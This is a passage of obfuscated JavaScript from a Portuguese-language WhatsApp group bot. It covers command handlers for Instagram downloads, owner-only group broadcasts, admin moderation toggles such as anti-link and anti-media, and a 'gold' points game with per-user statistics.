                _0x50740b("Realizando ação..");
                let _0x15b149 = await reqapi.instagram(_0x11e99e.trim());
                let _0x5f5a4f = _0x15b149.msg[0].type;
                var _0x1d302 = _0x5f5a4f === "mp4" ? "video/mp4" : _0x5f5a4f === "webp" ? "image/webp" : _0x5f5a4f === "jpg" ? "image/jpeg" : _0x5f5a4f === "mp3" ? "audio/mpeg" : "video/mp4";
                const _0x283ebd = {
                  url: _0x15b149.msg[0].url
                };
                const _0x1ae02f = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, {
                  [_0x1d302.split('/')[0]]: _0x283ebd,
                  'mimetype': _0x1d302,
                  'caption': "Se deseja baixar no formato áudio, use o comando: " + _0x141936 + "insta_audio " + _0x11e99e.trim()
                }, _0x1ae02f)["catch"](_0x304d92 => {
                  return _0x50740b("Erro.." + _0x304d92);
                });
              } catch (_0x31fc25) {
                return _0x50740b("Erro.." + _0x31fc25);
              }
              break;
            case "insta_audio":
            case "instagram_audio":
              try {
                if (!_0x11e99e.trim()) {
                  return _0x50740b("Exemplo: " + (_0x141936 + _0x267d4b) + " o link");
                }
                let _0x563d03 = await reqapi.instagram(_0x11e99e.trim());
                _0x50740b(_0x50f430);
                let _0x293c86 = _0x563d03.msg[0].type;
                var _0x1d302 = _0x293c86 === "webp" ? "image/webp" : _0x293c86 === "jpg" ? "image/jpeg" : _0x293c86 === "mp3" ? "audio/mpeg" : "audio/mpeg";
                const _0x423e6f = {
                  url: _0x563d03.msg[0].url
                };
                const _0x4885a8 = {
                  quoted: _0xd2050d
                };
                _0x5196be.sendMessage(_0x346d97, {
                  [_0x1d302.split('/')[0]]: _0x423e6f,
                  'mimetype': _0x1d302
                }, _0x4885a8)["catch"](_0x11d533 => {
                  return _0x50740b("Erro..");
                });
              } catch (_0x128676) {
                return _0x50740b("Erro..");
              }
              break;
            case 'bc':
            case "bcgroup":
            case "transmitir":
            case "transmissão":
              {
                if (!_0xf59944 && !_0xd2050d.key.fromMe) {
                  return _0x50740b("Este comando é apenas para o meu dono utilizar...");
                }
                if (!_0x11e99e.trim()) {
                  return _0x50740b("Texto onde?\n\nExemplo : " + (_0x141936 + _0x267d4b) + " BOA VISTA");
                }
                let _0x31e3a2 = await _0x5196be.groupFetchAllParticipating();
                let _0x4355e5 = Object.entries(_0x31e3a2).map(_0x4e5ad4 => _0x4e5ad4[1]);
                let _0x12d21c = [];
                for (let _0xc3abb of _0x4355e5) {
                  await sleep(1000);
                  const _0x7f0c51 = {
                    text: "「 TRANSMISSÃO DO BOT 」\n\n " + _0x11e99e
                  };
                  await _0x5196be.sendMessage(_0xc3abb.id, _0x7f0c51);
                  const _0x3da254 = {
                    id: _0xc3abb.id,
                    nome: _0xc3abb.subject
                  };
                  _0x12d21c.push(_0x3da254);
                }
                _0x50740b("Enviado com sucesso para os seguintes grupos:\n\n" + _0x12d21c.map(_0x2f42bf => "ID: " + _0x2f42bf.id + "\nNome: " + _0x2f42bf.nome).join("\n\n"));
              }
              break;
            case "bcaluguel2":
              {
                if (!_0xf59944 && !_0xd2050d.key.fromMe) {
                  return _0x50740b("Este comando é apenas para o meu dono utilizar...");
                }
                if (!_0x11e99e.trim()) {
                  return _0x50740b("Texto onde?\n\nExemplo : " + (_0x141936 + _0x267d4b) + " BOA VISTA");
                }
                let [_0x2b8a64, _0x2cbc38] = _0x11e99e.trim().normalize("NFD").replace(/[\u0300-\u036f]/g, '').split('|').map(_0x31d832 => _0x31d832.trim());
                let _0x4bf111 = await _0x5196be.groupFetchAllParticipating();
                let _0x3a31ef = Object.entries(_0x4bf111).map(_0x453b48 => _0x453b48[1]);
                let _0x43c8df = Math.floor(Date.now() / 1000);
                let _0x5b21ed = [];
                let _0xebb370 = [];
                if (!_0x2cbc38) {
                  _0x2cbc38 = _0x2b8a64;
                  _0x2b8a64 = '';
                }
                let _0x1865f2 = _0x3a31ef.map(_0x3dedae => _0x3dedae.id);
                let _0x3475ab = rg_aluguel.filter(_0x17368f => _0x1865f2.includes(_0x17368f.id_gp));
                await fs.writeFile("./DADOS/json/aluguel.json", JSON.stringify(_0x3475ab, null, 2), _0x8afd75 => {
                  if (_0x8afd75) {
                    console.error("Erro ao escrever arquivo:", _0x8afd75);
                  }
                });
                switch (_0x2b8a64.toLowerCase()) {
                  case "vencido":
                    _0x5b21ed = _0x3475ab.filter(_0x420cb5 => _0x420cb5.vencimento <= _0x43c8df).map(_0x24fb32 => _0x24fb32.id_gp);
                    break;
                  case "em dia":
                    _0x5b21ed = _0x3475ab.filter(_0x454fde => _0x454fde.vencimento > _0x43c8df).map(_0x5e85c3 => _0x5e85c3.id_gp);
                    break;
                  case "nao registrado":
                    _0x5b21ed = _0x3a31ef.filter(_0x4f1075 => !_0x3475ab.some(_0x45b8eb => _0x45b8eb.id_gp === _0x4f1075.id && !_0x4f1075.isCommunity && !_0x4f1075.isCommunityAnnounce)).map(_0x58098b => _0x58098b.id);
                    break;
                  case "7dias":
                    _0x5b21ed = _0x3475ab.filter(_0x355053 => {
                      let _0x45bc3b = _0x355053.vencimento - _0x43c8df;
                      return _0x45bc3b > 0 && _0x45bc3b <= 604800;
                    }).map(_0x42c3c6 => _0x42c3c6.id_gp);
                    break;
                  case "todos":
                    _0x5b21ed = _0x3a31ef.filter(_0x4acef2 => !_0x4acef2.isCommunity && !_0x4acef2.isCommunityAnnounce).map(_0x4a0302 => _0x4a0302.id);
                    break;
                  default:
                    _0x5b21ed = _0x3a31ef.filter(_0x365103 => !_0x365103.isCommunity && !_0x365103.isCommunityAnnounce).map(_0x56ddd5 => _0x56ddd5.id);
                    break;
                }
                for (let _0x28b1bf = 0; _0x28b1bf < _0x5b21ed.length; _0x28b1bf++) {
                  await sleep(1500);
                  let _0x24e0e4 = "「 TRANSMISSAO DO BOT 」\n\n" + _0x2cbc38;
                  const _0x38f8cd = {
                    text: _0x24e0e4,
                    mentions: _0x1c25a7
                  };
                  await _0x5196be.sendMessage(_0x5b21ed[_0x28b1bf], _0x38f8cd);
                  let _0x365d5e = _0x3a31ef.find(_0x58cdf6 => _0x58cdf6.id === _0x5b21ed[_0x28b1bf]);
                  if (_0x365d5e) {
                    const _0x34228c = {
                      id: _0x365d5e.id,
                      name: _0x365d5e.subject
                    };
                    _0xebb370.push(_0x34228c);
                  }
                }
                let _0x243041 = _0xebb370.map(_0x813370 => "Nome: " + _0x813370.name + "\nID: " + _0x813370.id).join("\n\n");
                _0x50740b("Enviado com sucesso para os seguintes grupos:\n\n" + _0x243041);
              }
              break;
            case "celular":
              try {
                if (!_0x11e99e.trim()) {
                  return _0x50740b("Exemplo: " + (_0x141936 + _0x267d4b) + " galaxy a9 2018");
                }
                _0x50740b(_0x50f430);
                let _0x3b8698 = await reqapi.celular(_0x11e99e.trim());
                _0x50740b("📱 Celular: " + (_0x3b8698?.["celular"] || "Não encontrado") + "\n\nInformações:\n" + (_0x3b8698?.["resumo"] || _0x3b8698?.["infoc"] || "Não encontrado, seja mais específico, a marca e a versão"));
              } catch (_0x230e90) {
                return _0x50740b("Erro...");
              }
              break;
            case "join":
            case "entrar":
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              var _0x18eff6 = _0x23d865.join(" ");
              if (!_0x18eff6) {
                return _0x50740b("Insira um link de convite ao lado do comando.");
              }
              if (_0x18eff6.includes("chat.whatsapp.com/") || _0x50740b("Ops, verifique o link que você inseriu.")) {
                _0x24e1d3 = _0x18eff6.split("app.com/")[1];
                try {
                  _0x5196be.groupAcceptInvite('' + _0x24e1d3);
                } catch (_0x17b1de) {
                  if (String(_0x17b1de).includes("resource-limit")) {
                    _0x50740b("O grupo já está com o alcance de 257 membros.");
                  }
                  if (String(_0x17b1de).includes("not-authorized")) {
                    _0x50740b("Não foi possível entrar no grupo.\nMotivo: Banimento.");
                  }
                }
              }
              break;
            case "antispam":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x23d865[0]) === 1) {
                if (_0x48bcb9) {
                  return _0x50740b("Ja esta ativo");
                }
                _0x326cbd[0].antispam = true;
                _0x137e44(_0x326cbd);
                _0x50740b("🌀 Ativou com sucesso o recurso de ANTI SPAM neste grupo 📝");
              } else {
                if (Number(_0x23d865[0]) === 0) {
                  if (!_0x48bcb9) {
                    return _0x50740b("Ja esta Desativado");
                  }
                  _0x326cbd[0].antispam = false;
                  _0x137e44(_0x326cbd);
                  _0x50740b("‼️ Desativou com sucesso o recurso de ANTI SPAM neste grupo✔️");
                } else {
                  _0x50740b("1 para ativar, 0 para desativar");
                }
              }
              break;
            case "antimarc":
            case "antimarcao":
              if (!_0x89cd51) {
                return _0x50740b(enviar.msg.grupo);
              }
              if (!_0x3f2f63) {
                return _0x50740b(enviar.msg.adm);
              }
              if (!_0x42a9f2) {
                return _0x50740b(enviar.msg.Badmin);
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x23d865[0]) === 1) {
                if (_0x16ba85) {
                  return _0x50740b("Ja esta ativo");
                }
                _0x326cbd[0].antimarc = true;
                _0x137e44(_0x326cbd);
                _0x50740b("🌀 Ativou com sucesso o recurso de anti marcações neste grupo 📝");
              } else {
                if (Number(_0x23d865[0]) === 0) {
                  if (!_0x16ba85) {
                    return _0x50740b("Ja esta Desativado");
                  }
                  _0x326cbd[0].antimarc = false;
                  _0x137e44(_0x326cbd);
                  _0x50740b("‼️ Desativou com sucesso o recurso de anti marcações neste grupo✔️");
                } else {
                  _0x50740b("1 para ativar, 0 para desativar");
                }
              }
              break;
            case "antiimg":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("Hmmmm");
              }
              if (Number(_0x23d865[0]) === 1) {
                if (_0x2ddc0a) {
                  return _0x50740b("Já Esta ativo");
                }
                _0x326cbd[0].antiimg = true;
                _0x137e44(_0x326cbd);
                _0x50740b("Ativou com sucesso o recurso de anti imagem neste grupo✔️");
              } else {
                if (Number(_0x23d865[0]) === 0) {
                  if (!_0x2ddc0a) {
                    return _0x50740b("Ja esta Desativado.");
                  }
                  _0x326cbd[0].antiimg = false;
                  _0x137e44(_0x326cbd);
                  _0x50740b("Desativou com sucesso o recurso de anti imagem neste grupo✔️");
                } else {
                  _0x50740b("1 para ativar, 0 para desativar");
                }
              }
              break;
            case "modo+18":
            case "nsfww":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("1 para ativar, 0 para desligar\nexemplo: " + _0x141936 + "modo+18 1 para ativar");
              }
              if (Number(_0x23d865[0]) === 1) {
                if (_0x2f3424) {
                  return _0x50740b("O modo+18 já está ativo");
                }
                _0x326cbd[0].nsfw = true;
                _0x137e44(_0x326cbd);
                _0x50740b("```✓Ativado com sucesso o modo+18 no grupo``` *" + _0x3071b5.subject + '*');
              } else {
                if (Number(_0x23d865[0]) === 0) {
                  if (!_0x2f3424) {
                    return _0x50740b("O modo+18 já está Desativado");
                  }
                  _0x326cbd[0].nsfw = false;
                  _0x137e44(_0x326cbd);
                  _0x50740b("```✓Modo+18 desativado com sucesso no grupo``` *" + _0x3071b5.subject + '*');
                } else {
                  _0x50740b("1 para ativar, 0 para desligar");
                }
              }
              break;
            case "antivideo":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("Hmmmm");
              }
              if (Number(_0x23d865[0]) === 1) {
                if (_0x14171f) {
                  return _0x50740b("Ja esta ativo");
                }
                _0x326cbd[0].antivideo = true;
                _0x137e44(_0x326cbd);
                _0x50740b("Ativou com sucesso o recurso de anti video neste grupo✔️");
              } else {
                if (Number(_0x23d865[0]) === 0) {
                  if (!_0x14171f) {
                    return _0x50740b("Ja esta Desativado");
                  }
                  _0x326cbd[0].antivideo = false;
                  _0x137e44(_0x326cbd);
                  _0x50740b("Desativou com sucesso o recurso de anti video neste grupo✔️");
                } else {
                  _0x50740b("1 para ativar, 0 para desativar");
                }
              }
              break;
            case "antiaudio":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("Hmmmm");
              }
              if (Number(_0x23d865[0]) === 1) {
                if (_0x1b617c) {
                  return _0x50740b("Ja esta ativo");
                }
                _0x326cbd[0].antiaudio = true;
                _0x137e44(_0x326cbd);
                _0x50740b("Ativou com sucesso o recurso de anti audio neste grupo✔️");
              } else {
                if (Number(_0x23d865[0]) === 0) {
                  if (!_0x1b617c) {
                    return _0x50740b("Ja esta Desativado");
                  }
                  _0x326cbd[0].antiaudio = false;
                  _0x137e44(_0x326cbd);
                  _0x50740b("Desativou com sucesso o recurso de anti audio neste grupo✔️");
                } else {
                  _0x50740b("1 para ativar, 0 para desativar");
                }
              }
              break;
            case "antisticker":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("Hmmmm");
              }
              if (Number(_0x23d865[0]) === 1) {
                if (_0x1a72a5) {
                  return _0x50740b("Já Esta ativo");
                }
                _0x326cbd[0].antisticker = true;
                _0x137e44(_0x326cbd);
                _0x50740b("Ativou com sucesso o recurso de anti sticker neste grupo✔️");
              } else {
                if (Number(_0x23d865[0]) === 0) {
                  if (!_0x1a72a5) {
                    return _0x50740b("Ja esta Desativado.");
                  }
                  _0x326cbd[0].antisticker = false;
                  _0x137e44(_0x326cbd);
                  _0x50740b("Desativou com sucesso o recurso de anti sticker neste grupo✔️");
                } else {
                  _0x50740b("1 para ativar, 0 para desativar");
                }
              }
              break;
            case "antidocumento":
            case "antidoc":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x23d865[0]) === 1) {
                if (_0x5aaef2) {
                  return _0x50740b("Ja esta ativo");
                }
                _0x326cbd[0].antidoc = true;
                _0x137e44(_0x326cbd);
                _0x50740b("Ativou com sucesso o recurso de anti documento neste grupo✔️");
              } else {
                if (Number(_0x23d865[0]) === 0) {
                  if (!_0x5aaef2) {
                    return _0x50740b("Ja esta Desativado");
                  }
                  _0x326cbd[0].antidoc = false;
                  _0x137e44(_0x326cbd);
                  _0x50740b("‼️ Desativou com sucesso o recurso de anti documento neste grupo✔️");
                } else {
                  _0x50740b("1 para ativar, 0 para desativar");
                }
              }
              break;
            case "antictt":
            case "anticontato":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x23d865[0]) === 1) {
                if (_0x17cef7) {
                  return _0x50740b("Ja esta ativo");
                }
                _0x326cbd[0].antictt = true;
                _0x137e44(_0x326cbd);
                _0x50740b("🌀 Ativou com sucesso o recurso de anticontato neste grupo 📝");
              } else {
                if (Number(_0x23d865[0]) === 0) {
                  if (!_0x17cef7) {
                    return _0x50740b("Ja esta Desativado");
                  }
                  _0x326cbd[0].antictt = false;
                  _0x137e44(_0x326cbd);
                  _0x50740b("‼️ Desativou com sucesso o recurso de anticontato neste grupo✔️");
                } else {
                  _0x50740b("1 para ativar, 0 para desativar");
                }
              }
              break;
            case "antiloc":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              try {
                if (_0x23d865.length < 1) {
                  return _0x50740b("1 pra ativar, 0 pra desligar");
                }
                if (Number(_0x23d865[0]) === 1) {
                  if (_0x2ac64a) {
                    return _0x50740b("Já está Ativo.");
                  }
                  _0x326cbd[0].antiloc = true;
                  _0x137e44(_0x326cbd);
                  _0x50740b("Ativou com sucesso o recurso de anti loc neste grupo✔️");
                } else {
                  if (Number(_0x23d865[0]) === 0) {
                    if (!_0x2ac64a) {
                      return _0x50740b("Já está Desativado.");
                    }
                    _0x326cbd[0].antiloc = false;
                    _0x137e44(_0x326cbd);
                    _0x50740b("Desativou com sucesso o recurso de anti loc neste grupo✔️");
                  } else {
                    _0x50740b("1 para ativar, 0 para desativar");
                  }
                }
              } catch {
                _0x50740b("Deu erro, tente novamente :/");
              }
              break;
            case "msgautoban":
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              try {
                if (_0x23d865.length < 1) {
                  return _0x50740b("1 pra ativar, 0 pra desligar");
                }
                if (Number(_0x23d865[0]) === 1) {
                  if (_0x495d57) {
                    return _0x50740b("Já está Ativo.");
                  }
                  _0x326cbd[0].msgautoban = true;
                  _0x137e44(_0x326cbd);
                  _0x50740b("Ativou com sucesso a msg do auto ban neste grupo✔️");
                } else {
                  if (Number(_0x23d865[0]) === 0) {
                    if (!_0x495d57) {
                      return _0x50740b("Já está Desativado.");
                    }
                    _0x326cbd[0].msgautoban = false;
                    _0x137e44(_0x326cbd);
                    _0x50740b("Desativou com sucesso a msg de auto ban neste grupo✔️");
                  } else {
                    _0x50740b("1 para ativar, 0 para desativar");
                  }
                }
              } catch {
                _0x50740b("Deu erro, tente novamente :/");
              }
              break;
            case "antilinkgp":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando só deve ser utilizado em Grupos.");
                }
                if (!_0x3f2f63) {
                  return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
                }
                if (!_0x42a9f2) {
                  return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
                }
                if (_0x23d865.length < 1) {
                  return _0x50740b("1 para ativar / 0 para desativar");
                }
                let _0x55b629 = _0x326cbd[0].antilinkhard;
                if (Number(_0x23d865[0]) === 1) {
                  if (_0x3cafb4) {
                    return _0x50740b("antilinkgp Já está ativo");
                  }
                  _0x326cbd[0].antilinkgp = true;
                  if (_0x55b629) {
                    _0x326cbd[0].antilinkhard = false;
                  }
                  _0x137e44(_0x326cbd);
                  _0x50740b("🌀 Ativou com sucesso o recurso de antilinkgp " + (_0x55b629 ? "e desativou o antilinkhardcore" : '') + " 📝");
                } else {
                  if (Number(_0x23d865[0]) === 0) {
                    if (!_0x3cafb4) {
                      return _0x50740b("Já está desativado");
                    }
                    _0x326cbd[0].antilinkgp = false;
                    _0x137e44(_0x326cbd);
                    _0x50740b("‼️ Desativou com sucesso o recurso de antilinkgp  ✔️");
                  } else {
                    _0x50740b("1 para ativar, 0 para desativar");
                  }
                }
              }
              break;
            case "advlink":
            case "advtlink":
            case "advtlinks":
            case "advlinks":
              if (!_0x3cafb4 && !_0x2b140d) {
                return _0x50740b("*Nenhum anti-link está ativo, ative um para utilizar essa função*");
              }
              if (_0x4b25e4(true, true, true)["true"]) {
                return _0x50740b(_0x4b25e4(true, true, true).txt);
              }
              if (_0x326cbd[0].advlink === undefined || _0x326cbd[0].advlink === false) {
                _0x326cbd[0].advlink = true;
                _0x137e44(_0x326cbd);
                _0x50740b("Função de advertir após um membro comum enviar link foi ativada com sucesso.");
              } else {
                _0x326cbd[0].advlink = false;
                _0x137e44(_0x326cbd);
                _0x50740b("Função de advertir após um membro comum enviar link foi desativada com sucesso.");
              }
              break;
            case "autobaixar":
            case "auto-baixar":
            case "auto-download":
            case "autodownload":
            case "auto-downloader":
            case "autodownloader":
              if (_0x4b25e4(true, true, true)["true"]) {
                return _0x50740b(_0x4b25e4(true, true, true).txt);
              }
              _0x326cbd[0].autobaixar = !_0x326cbd[0].autobaixar;
              _0x137e44(_0x326cbd);
              _0x50740b(_0x326cbd[0]?.["autobaixar"] ? "-> Ativou com sucesso o recurso de baixar mídias automáticas, por exemplo: tiktok, twitter, instagram, facebook, spotify, transcrição de áudio automatico ( Obs: Use uma vez para ativar, e use novamente para desativar. )" : "‼️ -> Desativou com sucesso o recurso de baixar mídias automáticas, por exemplo: tiktok, twitter, instagram, facebook, spotify, transcrição de áudio automatico ✔️ ( Obs: Use uma vez para ativar, e use novamente para desativar. )");
              break;
            case "antilinkhard":
            case "antilink":
              {
                if (!_0x89cd51) {
                  return _0x50740b("Este comando só deve ser utilizado em Grupos.");
                }
                if (!_0x3f2f63) {
                  return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
                }
                if (!_0x42a9f2) {
                  return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
                }
                if (_0x23d865.length < 1) {
                  return _0x50740b("1 para ativar / 0 para desativar");
                }
                let _0x8d2b3b = Number(_0x23d865[0]) === 1;
                let _0x1b1c8e = _0x326cbd[0].antilinkgp;
                if (_0x8d2b3b) {
                  if (_0x2b140d) {
                    return _0x50740b("o antilinkhard Já está ativo");
                  }
                  _0x326cbd[0].antilinkhard = true;
                  if (_0x1b1c8e) {
                    _0x326cbd[0].antilinkgp = false;
                  }
                  _0x137e44(_0x326cbd);
                  _0x50740b("🌀 Ativou com sucesso o recurso de antilinkhardcore " + (_0x3cafb4 ? "e desativou o antilinkgp" : '') + " 📝");
                } else {
                  if (Number(_0x23d865[0]) === 0) {
                    if (!_0x2b140d) {
                      return _0x50740b("Já está desativado");
                    }
                    _0x326cbd[0].antilinkhard = false;
                    _0x137e44(_0x326cbd);
                    _0x50740b("‼️ Desativou com sucesso o recurso de antilinkhard ✔️");
                  } else {
                    _0x50740b("1 para ativar, 0 para desativar");
                  }
                }
              }
              break;
            case 'x9':
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (!_0x3f2f63) {
                return _0x50740b("Só Administradores do grupo podem utilizar este comando..");
              }
              if (!_0x42a9f2) {
                return _0x50740b("O Bot precisa ser Administrador do grupo para utilizar este comando...");
              }
              if (_0x23d865.length < 1) {
                return _0x50740b("1 pra ligar / 0 pra desligar");
              }
              if (Number(_0x23d865[0]) === 1) {
                if (_0x2d5ff0) {
                  return _0x50740b("Ja esta ativo");
                }
                _0x326cbd[0].x9 = true;
                _0x137e44(_0x326cbd);
                _0x50740b("🌀 Ativou com sucesso o recurso de x9 neste grupo, irei notificar quando alguém for Rebaixado ou promovido a adm 😏..");
              } else {
                if (Number(_0x23d865[0]) === 0) {
                  if (!_0x2d5ff0) {
                    return _0x50740b("Ja esta Desativado");
                  }
                  _0x326cbd[0].x9 = false;
                  _0x137e44(_0x326cbd);
                  _0x50740b("‼️ Desativou com sucesso o recurso de x9 neste grupo, não irei mais notificar promoção de adm nem rebaixamento..✔️");
                } else {
                  _0x50740b("1 para ativar, 0 para desativar");
                }
              }
              break;
            case "visualizarmsg":
              if (!_0xf59944) {
                return _0x50740b("Este comando é apenas para o meu dono utilizar...");
              }
              if (!_0x2068a9) {
                nescessario.visualizarmsg = true;
                _0x13c255(nescessario);
                _0x50740b("🌀 Ativou com sucesso o recurso de visualizar todas as mensagens enviada em grupos e privado 📝");
              } else if (_0x2068a9) {
                nescessario.visualizarmsg = false;
                _0x13c255(nescessario);
                _0x50740b("‼️ Desativou com sucesso o recurso de visualizar todas as mensagens enviada em grupos e privado✔️");
              } else {
                _0x50740b("1 para ativar, 0 para desativar");
              }
              break;
            case "gold":
            case "statusgold":
            case "statusgolds":
            case "golds":
            case "consultargold":
              if (!_0x33d21e) {
                return _0x50740b("Só é possível utilizar este comando ativando o sistema de Golds\nExemplo: " + _0x141936 + "sistemgold 1");
              }
              if (!_0x89cd51) {
                return _0x50740b("Este comando só deve ser utilizado em Grupos.");
              }
              if (_0x267d4b == "consultargold") {
                _0xed07d5(_0x5e13bf);
              } else {
                var _0x115760 = _0x5e13bf || _0x246d48;
                var _0x45fcf2 = _0x326cbd[0].Chances;
                var _0x2fccc7 = _0x45fcf2[_0x45fcf2.findIndex(_0x565ce7 => _0x565ce7.id === _0x115760)];
                let _0x5d9323 = '';
                _0x45fcf2.forEach(_0x491957 => {
                  if (JSON.stringify(_0x491957.ChanceR).includes(_0x115760)) {
                    _0x5d9323 += "║✼ " + _0x491957.id.split('@')[0] + "\n║✼ _-_-_-_-_-_-_-_-_-_-_-_-_-_-\n";
                  }
                });
                var _0x3ea2b7 = _0x5e13bf || _0x246d48;
                var _0x3c9b8b = _0x326cbd[0].Chances;
                var _0xe774f6 = _0x3c9b8b[_0x3c9b8b.findIndex(_0x3b5cbc => _0x3b5cbc.id === _0x3ea2b7)];
                let _0x4b8be2 = '';
                _0x3c9b8b.forEach(_0x4c7379 => {
                  if (JSON.stringify(_0x4c7379.ChanceR).includes(_0x3ea2b7)) {
                    _0x4b8be2 += 1;
                  }
                });
                var _0xb423bf = _0x2fccc7?.["quiz"]?.["find"](_0x5b4b89 => _0x5b4b89)?.["errou"];
                var _0x5b354e = _0x2fccc7?.["quiz"]?.["find"](_0xad353 => _0xad353)?.["acertou"];
                var _0x9be06 = rggold[_0x3befc0].usus.find(_0x1d0b06 => _0x1d0b06.id === _0x115760);
                let _0x3af0df = JSON.parse(fs.readFileSync("./DADOS/json/pushname.json"));
                if (!_0x3af0df[_0x246d48]) {
                  _0x3af0df[_0x246d48] = _0x671b4b;
                }
                _0x3af0df[_0x246d48] = _0x671b4b;
                fs.writeFileSync("./DADOS/json/pushname.json", JSON.stringify(_0x3af0df, null, 2));
                if (_0x5e13bf) {
                  var _0x1a5e67 = _0x3af0df[_0x5e13bf];
                } else {
                  var _0x1a5e67 = _0x671b4b;
                }
                _0x5dcc57("ESTATÍSTICA DO USUÁRIO: \n" + _0x1a5e67 + "\n" + lermais + "\n╔┉✼┉═༺◈✼" + _0x2cd689 + "✼◈༻═┉✼┉╗\n║✼ SALDO GOLD: " + (_0x9be06?.["Golds"] || 0) + "\n║\n║✼ Total de vezes que roubou: " + (_0x2fccc7?.["ChanceR"]?.["length"] || 0) + "/5\n║\n║✼ Com escudo ?: " + (_0x2fccc7?.["Escudo"]?.["length"] > 0 ? "Sim" : "Não") + "\n║\n║✼ Chances para minerar Gold: " + (_0x2fccc7?.["ChanceG"] || 0) + "/3\n║\n║✼ Aviator Utilizado: " + (_0x2fccc7?.["aviator"] || 0) + "/3\n║\n║✼ Cara Coroa Utilizado: " + (_0x2fccc7?.["cara_coroa"] || 0) + "/3\n║\n║✼ Chances restantes para Vingança: " + (_0x2fccc7?.["Vinganca"] || 0) + "/1\n║\n║✼ Chances para a Roleta da Sorte: " + (_0x2fccc7?.["roletadasorte"] ? 1 : 0) + "/1\n║\n║✼ Chances restantes no cassino: " + (_0x2fccc7?.["cassino"] || 0) + "/5\n║\n║✼ Chances restantes no Quiz Número: " + (!_0xb423bf ? "0/2" : _0x5b354e === 2 ? "2/2" : _0xb423bf === 2 ? "2/2" : _0xb423bf === 1 && _0x5b354e === 1 ? "1/2" : _0x5b354e === 1 && _0xb423bf === 0 ? "1/2" : _0xb423bf === 1 && _0x5b354e === 0 ? "1/2" : "0/2") + "\n║\n║✼ Chances de enviar cachaça: " + (_0x2fccc7?.["Cachaca"] || 0) + "/1\n║\n║✼ Devendo a: " + (_0x9be06.emp_G && _0x9be06.emp_G.length > 0 ? '@' + _0x9be06.emp_G[0].id.split('@')[0] + " / " + _0x9be06.emp_G[0].Golds + " Golds" : "Ninguém.") + "\n╚┉✼┉═༺◈✼" + _0x2cd689 + "✼◈༻═┉✼┉╝\n╔┉✼┉═༺◈✼" + _0x2cd689 + "✼◈༻═┉✼┉╗\n║✼ Lista de usuários que te roubaram: " + _0x4b8be2.length + "\n" + _0x5d9323 + "\n╚┉✼┉═༺◈✼" + _0x2cd689 + "✼◈༻═┉✼┉╝\nBot: " + NomeDoBot);
              }
              break;
            case "rankgold":
              if (!_0x89cd51) {
